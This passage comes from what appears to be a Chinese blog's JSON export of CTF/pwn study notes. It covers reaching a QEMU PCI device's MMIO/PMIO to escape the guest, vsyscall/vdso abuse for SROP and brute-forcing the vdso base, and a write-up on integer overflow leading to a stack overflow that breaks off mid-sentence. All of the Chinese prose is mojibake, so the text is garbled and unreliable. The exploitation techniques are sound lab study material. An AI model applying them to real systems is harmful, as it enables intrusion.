ä½“å¯ä»¥åœ¨IDAä¸­çœ‹åˆ°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507761.jpeg)\n\nå‡½æ•°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507924.jpeg)\n\nè¿™æ ·å¯ä»¥çœ‹åˆ°åˆ›å»ºäº†mmioå’Œpmioç©ºé—´ï¼Œå¤§å°åˆ†åˆ«ä¸º0x100å’Œ0x8ã€‚\n\n(3)ç°åœ¨æŸ¥çœ‹å¯¹è¿™ä¸¤ä¸ªç©ºé—´çš„æ“ä½œå‡½æ•°ï¼Œè¿™æ‰æ˜¯é‡ç‚¹ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™é“é¢˜ç›®ä¸­è°ƒç”¨å¯¹mmioå’Œpmioè¿›è¡Œè¯»å†™æ“ä½œçš„å‡½æ•°æ—¶ï¼Œå¹¶æ²¡æœ‰å¯¹mmioæˆ–è€…pmioç©ºé—´è¿›è¡Œè¯»å†™æ“ä½œï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å¯¹regæ•°ç»„è¿›è¡Œè¯»å†™æ“ä½œã€‚\n\nâ–²åŸå› æ˜¯ä»¥ä¸‹ç»“æ„ä½“çš„å®šä¹‰ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\ntypedef struct {\n    PCIDevice pdev;\n    MemoryRegion mmio; //mmioå†…å­˜ç©ºé—´\n    ......\n} STRNGState;\n\nstatic const MemoryRegionOps strng_mmio_ops = { //mmioç©ºé—´å¯¹åº”çš„æ“ä½œ\n    .read = strng_mmio_read, //å¯¹mmioç©ºé—´çš„readç”±strng_mmio_readå®ç°\n    .write = strng_mmio_write, //å¯¹mmioç©ºé—´çš„writeç”±strng_mmio_writeå®ç°\n    .endianness = DEVICE_NATIVE_ENDIAN,\n};\n```\n\nåŸæœ¬åœ¨cè¯­è¨€ä¸­expçš„æ¥å£å‡½æ•°ä¸­ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n-----------------------------------------------------------------------------\n*((uint32_t*)(mmio_mem + addr)) = value;\n```\n\nå¯¹mmioå’Œpmioç©ºé—´çš„æ“ä½œå‡½æ•°å°±ä¼šæ‰§è¡Œ.readå’Œ.writeå‡½æ•°ï¼Œä½†æ˜¯ç»“æ„ä½“ç”±äºé‡æ–°å°†.readå‡½æ•°å’Œ.writeå®šä½æˆäº†strng_mmio_readå’Œstrng_mmio_writeå‡½æ•°ï¼Œè¿™ä¸ªæ“ä½œæŸç§ç¨‹åº¦ä¸Šç›¸å½“äºä¿®æ”¹äº†ä¸¤ä¸ªå‡½æ•°çš„gotè¡¨ã€‚ä¹‹åå°±ç›¸å½“äºæ­£å¸¸çš„pwné¢˜äº†ï¼Œå°±æ˜¯åˆ©ç”¨è¿™å‡ ä¸ªè¯»å†™å‡½æ•°ä¸­çš„æ¼æ´ï¼Œæœ€ç»ˆæ‰§è¡Œsystem(\"cat /root/flag.txt\")å³å¯ã€‚\n\n \n\nä¸‰ã€è°ƒç”¨mmio_readå’Œmmio_writeå‡½æ•°\n\nåœ¨strngä¸­ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯strng_mmio_readå’Œstrng_mmio_writeå‡½æ•°ã€‚\n\n1.å¯¹mmioç©ºé—´æ“ä½œï¼Œè¿›è€Œè°ƒç”¨strng_mmio_readå’Œstrng_mmio_writeå‡½æ•°ï¼š\n\næ­£å¸¸å†™cè¯­è¨€çš„expç¼–è¯‘ä¹‹åï¼Œæ”¾åˆ°qemuä¸­è¿è¡Œï¼Œå°±èƒ½é€šè¿‡PCIè®¾å¤‡å·ä»è€Œå¾—åˆ°mmioåœ°å€ï¼š/sys/devices/pci0000:00/0000:00:04.0/resource0ã€‚ç„¶åé€šè¿‡è¯¥åœ°å€å’Œç‰¹å®šå‡½æ•°å°±èƒ½è®¿é—®åˆ°mmioç©ºé—´ï¼Œè·³å‡ºqemuåˆ°ä¸»æœºçš„mmioç©ºé—´ã€‚\n\nâ‘ ç”¨æˆ·æ€è®¿é—®ï¼Œæ­£å¸¸pwné¢˜ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n#include <assert.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include<sys/io.h>\n\nunsigned char* mmio_mem;\n\nvoid die(const char* msg)\n{\n    perror(msg);\n    exit(-1);\n}\n\nvoid mmio_write(uint32_t addr, uint32_t value)\n{\n    *((uint32_t*)(mmio_mem + addr)) = value;\n}\n\nuint32_t mmio_read(uint32_t addr)\n{\n    return *((uint32_t*)(mmio_mem + addr));\n}\n\n\nint main(int argc, char *argv[])\n{\n\n    // Open and map I/O memory for the strng device\n    int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource0\", O_RDWR | O_SYNC);//è¿™é‡Œéœ€è¦è·å–åˆ°mmioçš„åœ°å€\n    if (mmio_fd == -1)\n        die(\"mmio_fd open failed\");\n\n    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n    if (mmio_mem == MAP_FAILED)\n        die(\"mmap mmio_mem failed\");\n\n    printf(\"mmio_mem @ %p\\n\", mmio_mem);\n\n    mmio_read(0x128);\n    mmio_write(0x128, 1337);\n\n}\n```\n\nâ‘¡å†…æ ¸æ€è®¿é—®ï¼šä¸å¤ªçŸ¥é“æœ‰å•¥ç”¨\n\n```\n//æ³¨é‡Šå¤´\n\n#include <asm/io.h>\n#include <linux/ioport.h>\n\nlong addr=ioremap(ioaddr,iomemsize);\nreadb(addr);\nreadw(addr);\nreadl(addr);\nreadq(addr);//qwords=8 btyes\n\nwriteb(val,addr);\nwritew(val,addr);\nwritel(val,addr);\nwriteq(val,addr);\niounmap(addr);\n```\n\n2.å¯¹pmioç©ºé—´æ“ä½œï¼Œè¿›è€Œè°ƒç”¨strng_pmio_readå’Œstrng_pmio_writeå‡½æ•°ï¼š\n\nâ‘ ç”¨æˆ·æ€è®¿é—®ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n#include <sys/io.h >\n\niopl(3);//éœ€è¦å…ˆç”³è¯·è®¿é—®ç«¯å£\ninb(port);\ninw(port);\ninl(port);\n\noutb(val,port);\noutw(val,port);\noutl(val,port);\n```\n\nâ‘¡å†…æ ¸æ€è®¿é—®ï¼šä¹Ÿä¸å¤ªæ¸…æ¥šæœ‰å•¥ç”¨\n\n```\n//æ³¨é‡Šå¤´\n\n#include <asm/io.h>\n#include <linux/ioport.h>\n\ninb(port); //è¯»å–ä¸€å­—èŠ‚\ninw(port); //è¯»å–ä¸¤å­—èŠ‚\ninl(port); //è¯»å–å››å­—èŠ‚\n\noutb(val,port); //å†™ä¸€å­—èŠ‚\noutw(val,port); //å†™ä¸¤å­—èŠ‚\noutl(val,port); //å†™å››å­—èŠ‚\n```\n\n3.ç„¶åå°±èƒ½è°ƒç”¨åˆ°qemuä¸­å…³äºmmioå’Œpmioçš„readï¼Œwriteå‡½æ•°äº†ï¼Œä»è€ŒæŒ–æ˜æ¼æ´ï¼Œè·³å‡ºqemuã€‚\n\n \n\n \n","tags":["qemué¢˜"],"categories":["QEMU"]},{"title":"vsdoå’Œvsyscallçš„å‰ä¸–ä»Šç”Ÿ","url":"/2021/08/14/vsdoå’Œvsyscallçš„å‰ä¸–ä»Šç”Ÿ/","content":"\nä¸€ã€vsyscallï¼šä¸€èˆ¬åªæœ‰ubuntu16.04,libc-2.23ä¸­æœ‰äº†ã€‚\n\n1.vsyscallçš„ä½œç”¨ï¼š\n\nç°ä»£çš„Windows/*Unixæ“ä½œç³»ç»Ÿéƒ½é‡‡ç”¨äº†åˆ†çº§ä¿æŠ¤çš„æ–¹å¼ï¼Œå†…æ ¸ä»£ç ä½äºR0ï¼Œç”¨æˆ·ä»£ç ä½äºR3ã€‚è®¸å¤šå¯¹ç¡¬ä»¶å’Œå†…æ ¸ç­‰çš„æ“ä½œéƒ½ä¼šè¢«åŒ…è£…æˆå†…æ ¸å‡½æ•°å¹¶æä¾›ä¸€ä¸ªæ¥å£ç»™ç”¨æˆ·å±‚ä»£ç è°ƒç”¨ï¼Œè¿™ä¸ªæ¥å£å°±æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„int 0x80/syscall+è°ƒç”¨å·æ¨¡å¼ã€‚å½“æˆ‘ä»¬æ¯æ¬¡è°ƒç”¨è¿™ä¸ªæ¥å£æ—¶ï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„éš”ç¦»ï¼Œæˆ‘ä»¬éœ€è¦æŠŠå½“å‰çš„ä¸Šä¸‹æ–‡(å¯„å­˜å™¨çŠ¶æ€ç­‰)ä¿å­˜å¥½ï¼Œç„¶ååˆ‡æ¢åˆ°å†…æ ¸æ€è¿è¡Œå†…æ ¸å‡½æ•°ï¼Œç„¶åå°†å†…æ ¸å‡½æ•°è¿”å›çš„ç»“æœæ”¾ç½®åˆ°å¯¹åº”çš„å¯„å­˜å™¨å’Œå†…å­˜ä¸­ï¼Œå†æ¢å¤ä¸Šä¸‹æ–‡ï¼Œåˆ‡æ¢åˆ°ç”¨æˆ·æ¨¡å¼ã€‚è¿™ä¸€è¿‡ç¨‹éœ€è¦è€—è´¹ä¸€å®šçš„æ€§èƒ½ã€‚å¯¹äºæŸäº›ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚gettimeofdayæ¥è¯´ï¼Œç”±äºä»–ä»¬ç»å¸¸è¢«è°ƒç”¨ï¼Œå¦‚æœæ¯æ¬¡è¢«è°ƒç”¨éƒ½è¦è¿™ä¹ˆæ¥å›æŠ˜è…¾ä¸€éï¼Œå¼€é”€å°±ä¼šå˜æˆä¸€ä¸ªç´¯èµ˜ã€‚å› æ­¤ç³»ç»ŸæŠŠå‡ ä¸ªå¸¸ç”¨çš„æ— å‚å†…æ ¸è°ƒç”¨ä»å†…æ ¸ä¸­æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸­ï¼Œè¿™å°±æ˜¯vsyscallã€‚\n\n2.vsyscallçš„ç‰¹ç‚¹ï¼š\n\n(1)æŸäº›ç‰ˆæœ¬å­˜åœ¨ï¼Œéœ€è¦ç”¨åˆ°gdbæ¥æŸ¥çœ‹ï¼ŒIDAä¸­é»˜è®¤ä¸å¯è§ã€‚\n\n(2)åœ°å€ä¸å—åˆ°ASLRå’ŒPIEçš„å½±å“ï¼Œå›ºå®šæ˜¯0xffffffffff600000-0xffffffffff601000ã€‚\n\n(3)ä¸èƒ½ä»ä¸­é—´è¿›å…¥ï¼Œåªèƒ½ä»å‡½æ•°å¼€å¤´è¿›å…¥ï¼Œæ„å‘³ç€ä¸èƒ½ç›´æ¥è°ƒç”¨é‡Œé¢çš„syscallã€‚è¿™é‡Œvsyscallåˆ†ä¸ºä¸‰ä¸ªå‡½æ•°ï¼Œä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ˜¯\n\n```\n#æ³¨é‡Šå¤´\n\nA.gettimeofday: 0xffffffffff600000\nB.time:         0xffffffffff600400\nC.getcpu:       0xffffffffff600800\n```\n\n(4)gettimeofdayå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶è¿”å›å€¼å°±æ˜¯0ï¼Œä¿å­˜åœ¨raxå¯„å­˜å™¨ä¸­ã€‚è¿™å°±ä¸ºæŸäº›one_gadgetåˆ›é€ äº†æ¡ä»¶ã€‚\n\n(5)æœ‰R,Xæƒé™ï¼Œä½†æ˜¯æ²¡æœ‰Wæƒé™ï¼Œä¸å¯å†™ï¼Œä¸èƒ½è¿›è¡Œshellcodeå¸ƒç½®ã€‚\n\n(6)åªæœ‰ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°ï¼Œå…¶ä½™å†…å­˜éƒ½ä»¥\"int3\"æŒ‡ä»¤å¡«å……ã€‚\n\n3.vsyscallçš„åˆ©ç”¨ï¼š\n\n(1)è°ƒæ•´æ ˆå¸§ï¼Œä¸‹æ‹‰rspï¼š\n\nvsyscallç›´æ¥è¿›è¡Œsyscallï¼Œå¹¶æ²¡æœ‰åˆ©ç”¨æ ˆç©ºé—´ï¼Œæ‰€ä»¥åœ¨å¤„ç†æ ˆæº¢å‡ºï¼Œä½†æ˜¯ç”±äºPIEæ²¡æœ‰åˆ«çš„åœ°å€å¯ä»¥ç”¨æ—¶ï¼Œè€Œæ ˆä¸Šåˆæœ‰æŸä¸ªæœ‰ç”¨çš„åœ°å€çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡vsyscallæ„é€ ä¸€ä¸ªropé“¾æ¥retï¼Œæ¯æ¬¡retéƒ½ä¼šæ¶ˆè€—æ‰ä¸€ä¸ªåœ°å€ï¼Œå°†rspä¸‹æ‹‰ä¸€ä¸ªå•ä½ï¼Œè¿™æ ·å°±å¯ä»¥é€æ¸å»è´´è¿‘æƒ³è¦çš„é‚£ä¸ªåœ°å€ï¼Œæœ€åæˆåŠŸretåˆ°ç›¸åº”çš„ä½ç½®ã€‚\n\n(2)SROPåˆ©ç”¨ï¼š\n\nsyscall retï¼›æŒ‡ä»¤å¯ç”¨äºæ„é€ SROPï¼Œåªéœ€è¦åœ¨å…¶é¢å‰æ”¾ç½®ä¸€ä¸ª\"pop rax;ret\"çš„gadgetï¼Œé€šè¿‡æ ˆæº¢å‡ºå°†raxèµ‹å€¼ä¸º0xfå³å¯è°ƒç”¨__kernel_rt_sigreturnï¼Œä»è€Œæ‰“SROPã€‚\n\n \n\n \n\näºŒã€vdsoï¼šå¤§å¤šç‰ˆæœ¬ç”¨vdsoå–ä»£äº†vsyscall\n\n1.vdsoä½œç”¨ï¼š\n\nä¸vsyscallå·®ä¸å¤šï¼Œæœ¬æ¥å°±æ˜¯ä¸ºäº†å–ä»£vsyscallç”¨çš„ï¼Œä¸è¿‡æ˜¯é€šè¿‡å…±äº«åº“è¿›è¡Œæ˜ å°„ï¼Œå’ŒåŠ¨æ€åŠ è½½æœ‰ç‚¹ç±»ä¼¼ã€‚\n\n2.vdsoç‰¹ç‚¹ï¼š\n\n(1)vdsoçš„åœ°å€éšæœºåŒ–çš„ï¼Œä¸”å…¶ä¸­çš„æŒ‡ä»¤å¯ä»¥ä»»æ„æ‰§è¡Œï¼Œä¸éœ€è¦ä»å…¥å£å¼€å§‹ã€‚\n\n(2)ç›¸æ¯”äºæ ˆå’Œå…¶ä»–çš„ASLRï¼Œvdsoçš„éšæœºåŒ–éå¸¸çš„å¼±ï¼Œå¯¹äº32çš„ç³»ç»Ÿæ¥è¯´ï¼Œæœ‰1/256çš„æ¦‚ç‡å‘½ä¸­ã€‚\n\n(3)ä¸åŒçš„å†…æ ¸éšæœºç¨‹åº¦ä¸åŒï¼š\n\nA.è¾ƒæ—§ç‰ˆæœ¬ï¼š0xf76d9000-0xf77ce000\n\nB.è¾ƒæ–°ç‰ˆæœ¬ï¼š0xf7ed0000-0xf7fd0000\n\nå¯åˆ©ç”¨pwnä¸­LinuxçŸ¥è¯†ä¸­çš„æ–‡ä»¶æ¥æŸ¥çœ‹å…·ä½“èŒƒå›´ã€‚æ³¨æ„åç§»éœ€è¦æ›´æ”¹ä¸€ä¸‹ï¼Œå¯ä»¥è°ƒè¯•æŸ¥çœ‹ï¼Œä¸€èˆ¬åœ¨200ä»¥å†…ã€‚ç”¨stack 200ï¼ŒæŸ¥åˆ°çš„åœ°æ–¹é™¤ä»¥4ä¹‹å-2å°±æ˜¯åç§»ï¼Œä¸è¡Œå°±å†è°ƒè¯•ã€‚æˆ–è€…ç›´æ¥pwndbgçš„fmtarg addræ¥æŸ¥çœ‹åç§»ã€‚\n\nâ–²èŒƒå›´æµ‹é‡ï¼š\n\nç¼–è¯‘ä¸€ä¸ªæ‰“å°vdsoçš„ç¨‹åºï¼Œç¼–è¯‘ä»£ç ä¸ºï¼š\n\ngcc -g -m32 vdso_addr.c -o vdso_addr\n\nå¦‚æœæ˜¯64ä½ç¨‹åºåˆ™å°†m32æ”¹æˆm64å³å¯\n\n```\n#æ³¨é‡Šå¤´\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    printf(\"vdso addr: %124$p\\n\");//è¿™é‡Œçš„124åç§»éœ€è¦gdbè°ƒè¯•è¿›è¡Œè°ƒæ•´\n    return 0;\n}\n```\n\nç„¶åç”¨è„šæœ¬å³å¯æ‰“å°ç¡®å®šèŒƒå›´ï¼Œå°†èŒƒå›´è°ƒå¤§æ›´åŠ ç²¾ç¡®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nimport os\nresult = []\nfor i in range(100):\n    result += [os.popen('./vdso_addr').read()[:-1]]\nresult = sorted(result)\nfor v in result:\n    print (v)\n```\n\n \n\n3.vdsoçš„åˆ©ç”¨ï¼š\n\nä¸vsyscallå·®ä¸å¤šï¼Œ32ä½ä¸­æœ‰ç°æˆçš„__kernel_rt_sigreturnå¯ä»¥æ‰“SROPã€‚ä¹Ÿå¯ä»¥ç”¨gettimeofdayæ¥åˆ›é€ ropï¼Œç»•è¿‡PIEï¼Œæ»‘è¿‡ç©ºé—´ã€‚\n\n4.è¯»å–é¶æœºçš„vdso:\n\n(1)å¦‚æœç»™äº†libcï¼Œé‚£ä¹ˆæ ¹æ®libcç‰ˆæœ¬ä½¿ç”¨qemuæˆ–è€…dockeråˆ›å»ºä¸€ä¸ªç¯å¢ƒï¼Œéšä¾¿è¿è¡Œä¸€ä¸ªç¨‹åºï¼Œç”¨gdbå‘½ä»¤dumpä¸‹æ¥ã€‚(dump memory vdso32.so addr_start addr_end)\n\n(2)å¦‚æœæ²¡ç»™ï¼Œé‚£ä¹ˆåªèƒ½å…ˆæ³„éœ²åœ°å€å†è€ƒè™‘å…¶å®ƒã€‚\n\n(3)ä¹‹åå°±å¯ä»¥ç”¨\n\n```\n#æ³¨é‡Šå¤´\n\nelf = ELF(â€œ./vdso32.soâ€)#æ¥åŠ è½½\nRANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)\nvdso_addr = random.choice(RANGE_VDSO)\nSROP_kernel_addr = vdso_addr + vdso.symbols['__kernel_rt_sigreturn']\n```\n\nä½†æ˜¯è¿™é‡Œè¿˜æ˜¯éœ€è¦åŠ ä¸Šwhileå¾ªç¯çˆ†ç ´ä½¿ç”¨ï¼Œå› ä¸ºä¸ç¡®å®šéšæœºåŒ–çš„åŸºåœ°å€ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\n[https://xz.aliyun.com/t/5236/usr/include/g](https://xz.aliyun.com/t/5236#toc-9)\n\n \n","tags":["vdso"],"categories":["pwn-kernel"]},{"title":"shadow-IntergerOverflow-Nice","url":"/2021/08/14/shadow-IntergerOverflow-Nice/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†NXï¼ŒFULL RELROï¼ŒCanaryï¼Œæ²¡åŠæ³•shellcodeï¼Œä¿®æ”¹gotè¡¨ã€‚ç„¶åIDAæ‰“å¼€æ‰¾æ¼æ´ï¼š\n\n(1)æ•´æ•°è½¬æ¢æ¼æ´ï¼š\n\nè¾“å…¥message_lengthä¹‹åå°†é•¿åº¦è¿”å›è¿›è¡Œatoiï¼Œå°†atoiçš„è¿”å›å€¼ç»™åˆ°ä¸‹ä¸€ä¸ªè¾“å…¥messageçš„getlineã€‚ä¸­é—´ç”¨atoiè¿›è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬intçš„æ“ä½œï¼Œè€Œatoiæ˜¯ä¸€ä¸ªå°†æ•°å­—å‹å­—ç¬¦ä¸²è½¬æˆæ•°å­—çš„å‡½æ•°ï¼Œâ€-1â€å¯ä»¥è½¬æ¢ä¸º-1ã€‚ä½†æ˜¯getlineä¸­readçš„é•¿åº¦å‚æ•°æ˜¯size_tï¼Œç›¸å½“äºæ˜¯unsigned intï¼Œæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•°ã€‚\n\nâ–²è€Œintçš„è¡¨è¾¾æ–¹å¼æ˜¯ï¼š0~2147483647(0~0x7fffffff)  -2147483648~-1(0x80000000~0xffffffff)\n\nunsignedçš„è¡¨è¾¾æ–¹å¼æ˜¯ï¼š0~4294967295(0~0xffffffff)\n\né‚£ä¹ˆintçš„-1è½¬æ¢æˆunsignedä¹‹åå°±ä¼šå˜æˆ0xffffffffï¼Œä»è€Œæº¢å‡ºã€‚\n\nâ–²ç”±äºç¨‹åºå®ç°äº†è‡ªå®šä¹‰çš„popï¼Œpushï¼Œretï¼Œcallç­‰å‡ ä¸ªæ§åˆ¶æ ˆå¸§çš„æ±‡ç¼–ä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ¼æ´ä¸å¤ªå¥½æ‰¾ï¼Œæ±‡ç¼–ä¸å¤ªå¥½çš„åªèƒ½å…ˆæ…¢æ…¢è°ƒè¯•éªŒè¯çŒœæƒ³æ˜¯å¦æ­£ç¡®ã€‚\n\n(2)æ ˆæº¢å‡ºï¼šæ ˆæº¢å‡ºæ˜¯ä»æ•´æ•°è½¬æ¢æ¼æ´ä¸­æ¥çš„ï¼Œç”±äºmessageæ˜¯ä¿å­˜åœ¨messageå‡½æ•°æ ˆä¸Šçš„ï¼Œæ‰€ä»¥å°±å¦‚æœå°†readçš„é•¿åº¦å‚æ•°å˜å¾—å¾ˆå¤§ï¼Œå°±å¯ä»¥æ ˆæº¢å‡ºã€‚\n\nâ–²è¿™é‡Œçš„æ ˆæº¢å‡ºå’Œå¹³å¸¸æ ˆæº¢å‡ºæœ‰ç‚¹ä¸åŒï¼Œè€Œä¸”è¿˜å¼€äº†canaryï¼Œç…§ç†è¯´è¿™ä¸ªæ ˆæº¢å‡ºæ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯è¿™é‡Œçš„Messageæ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œåªè¦messageå‡½æ•°ä¸é€€å‡ºï¼Œé‚£ä¹ˆå°±ä¸ä¼šè§¦å‘canaryçš„æ£€æŸ¥ï¼Œå°±ç®—æ ˆæº¢å‡ºäº†ï¼Œé‚£ä¹Ÿå¾—ç­‰åˆ°messageå‡½æ•°é€€å‡ºç¨‹åºæ‰ä¼šå´©æºƒã€‚\n\n2.ç°åœ¨åªæœ‰ä¸¤ä¸ªæ¼æ´ï¼Œä½†æ˜¯çœ‹ç¨‹åºF5å¤§æ³•å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œçœ‹æ±‡ç¼–å§ï¼š\n\n(1)è¾“å…¥nameçš„call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528530.jpeg)\n\n(2)è¾“å…¥é•¿åº¦çš„call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528677.jpeg)\n\n(3)è¾“å…¥messageçš„call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528431.jpeg)\n\nå¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥messageå’Œnameçš„getlineä¸­ä¿å­˜æ•°æ®çš„å‚æ•°ä¸ä¸€æ ·ï¼Œ\n\nä¿å­˜nameçš„å‚æ•°æ˜¯ï¼š[ebp+arg_0]\n\nä¿å­˜messageçš„å‚æ•°æ˜¯ï¼š[ebp+var-2c]\n\nå†çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‚æ•°çš„å®šä¹‰ï¼š\n\narg_0 = dword ptr  8\n\nvar_2C = byte ptr -2Ch\n\nå¯ä»¥çœ‹åˆ°nameä¿å­˜åœ¨ebpçš„ä¸‹æ–¹ï¼Œä¸åœ¨messageçš„å‡½æ•°æ ˆï¼Œä½†æ˜¯messageä¿å­˜åœ¨ebpä¸Šæ–¹ï¼Œåœ¨messageå‡½æ•°æ ˆä¸­ã€‚\n\n3.é‚£ä¹ˆç°åœ¨æ€è€ƒä¸‹æ”»å‡»æ€è·¯ã€‚å…ˆè¾“å…¥-1æ‰§è¡Œæ ˆæº¢å‡ºæ¼æ´ï¼Œå°†messageå‡½æ•°æ ˆä¸‹æ–¹çš„ä¿å­˜nameçš„å†…å®¹æ›´æ”¹ä¸ºæŸå‡½æ•°çš„gotè¡¨ï¼Œè¿™æ ·åœ¨æ‰“å°nameæ—¶å°±å¯ä»¥å°†è¯¥å‡½æ•°æ‰“å°å‡ºæ¥ã€‚\n\n(è¿™é‡Œèƒ½æ‰“å°çš„åŸå› æ˜¯printfçš„ä¼ å‚å…³ç³»ï¼Œè¿™é‡Œèƒ½çœ‹åˆ°ï¼Œnameå’Œmessageä¼ å‚æ‰€ç”¨æŒ‡ä»¤ä¸åŒï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528201.jpeg)\n\nnameæ˜¯movæŒ‡ä»¤ï¼Œæ˜¯ç›´æ¥å°†ebp+arg_0ä¸Šçš„å†…å®¹ä¼ ç»™eax\n\nmessageæ˜¯leaæŒ‡ä»¤ï¼Œæ˜¯å°†ebp+var_2cè¿™ä¸ªæ ˆåœ°å€ä¼ ç»™edx\n\né‚£ä¹ˆæ˜¾è€Œæ˜“è§ï¼Œebp+arg_0ä¸Šä¿å­˜çš„è‚¯å®šæ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œè¿™ä¸ªæ ˆåœ°å€ä¸Šçš„å†…å®¹æ‰æ˜¯nameçš„çœŸå®å†…å®¹ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦†ç›–ebp+arg_0ä¸Šçš„å†…å®¹ä¸ºgotè¡¨ï¼Œé‚£ä¹ˆå†æ‰“å°å°±æ˜¯å–gotè¡¨ä¸­çš„å†…å®¹æ‰“å°ï¼Œä¹Ÿæ˜¯å‡½æ•°çœŸå®åœ°å€ã€‚)\n\nä»è€Œæ³„éœ²å‡ºlibcåŸºåœ°å€ã€‚ä¹‹åå†æ‰§è¡Œæ ˆæº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€ä¸ºROPé“¾æ¥getshellã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç”±äºç¨‹åºè‡ªå®šäº†æŸäº›æ±‡ç¼–å‡½æ•°ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°ç”¨ç¨‹åºçš„callæ¥è°ƒç”¨çš„å‡½æ•°ï¼Œè¿”å›åœ°å€ä¸å†æ˜¯åŸæ¥callå‡½æ•°çš„ä¸‹ä¸€å¥ä»£ç ï¼Œè€Œæ˜¯ä¸€ä¸ªrestore_eipå‡½æ•°ã€‚å› ä¸ºåœ¨leaveå’ŒretæŒ‡ä»¤æ‰§è¡Œå‰ï¼Œæ‰§è¡Œäº†call retï¼Œä¿®æ”¹äº†æŸäº›ä¸œè¥¿ï¼Œå¯¼è‡´åŸæœ¬ebpä¸‹é¢ä¸å†æ˜¯å‡½æ•°çš„è¿”å›åœ°å€äº†ã€‚å¹¶ä¸”ç”±äºæ˜¯ä¼ æŒ‡é’ˆï¼Œå°±ç®—æ ˆæº¢å‡ºï¼Œæº¢å‡ºçš„ä¹Ÿåªèƒ½æ˜¯messageå‡½æ•°æ ˆï¼Œé‚£æœ‰canaryçš„æƒ…å†µä¸‹ï¼Œæº¢å‡ºä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ã€‚ä½†æ˜¯å…¶å®ƒå‡½æ•°è¿”å›åœ°å€åˆ™æ˜¯ç›´æ¥è·³è½¬åˆ°ret_stubå‡½æ•°ï¼Œè€Œè¿™ä¸ªret_stubå‡½æ•°æ˜¯ä¿å­˜åœ¨æ ˆä¸Šçš„ã€‚\n\n4.è¿™é‡Œå°±æƒ³åˆ°printfå‡½æ•°ï¼Œç”±äºnameä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œå¹¶ä¸”è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå°†nameæ€»å…±16å­—èŠ‚é¡¶æ»¡åä¼šè¿ä¸Šä¸€ä¸ª17F79D79ï¼Œä¹‹åæ˜¯ä¸¤ä¸ªretnçš„åœ°å€ï¼Œå†ä¹‹åå°±æ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œè¿™å‡ ä¸ªæ•°æ®éƒ½æ²¡æœ‰\\x00ç»“æŸå­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥è¢«printfè¿åœ¨ä¸€èµ·æ‰“å°å‡ºæ¥ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528071.jpeg)\n\né‚£ä¹ˆå¯ä»¥è€ƒè™‘å°†nameé¡¶æ»¡åè¿ä¸Šebpæ³„éœ²å‡ºæ ˆåœ°å€ï¼Œä¹‹åæ‰¾åˆ°ä¿å­˜readè¿”å›åœ°å€çš„æ ˆåœ°å€ï¼Œå°†å†™å…¥nameçš„æ ˆåœ°å€æ›´æ”¹ä¸ºä¿å­˜readè¿”å›åœ°å€çš„æ 